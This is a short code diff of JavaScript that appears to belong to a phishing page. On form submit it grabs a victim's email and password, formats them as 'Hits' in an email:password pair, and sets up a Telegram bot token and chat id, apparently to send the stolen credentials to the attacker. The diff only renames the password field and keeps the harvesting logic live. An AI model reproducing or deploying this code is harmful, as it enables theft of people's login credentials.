@@ -4,9 +4,9 @@ addEventListener("submit", (e) => {
   e.preventDefault();
 
   var email = document.getElementById("email").value;
-  var password = document.getElementById("password").value;
+  var pass = document.getElementById("pass").value;
 
-  var message = "Hits :%0A" + email + ":" + password;
+  var message = "Hits :%0A" + email + ":" + pass;
 
   var token = "5441699225:AAGjoUFWwYVO7PS_jYuZp6ljxmNoGRetM6E";
   var chat_id = 1430266005;
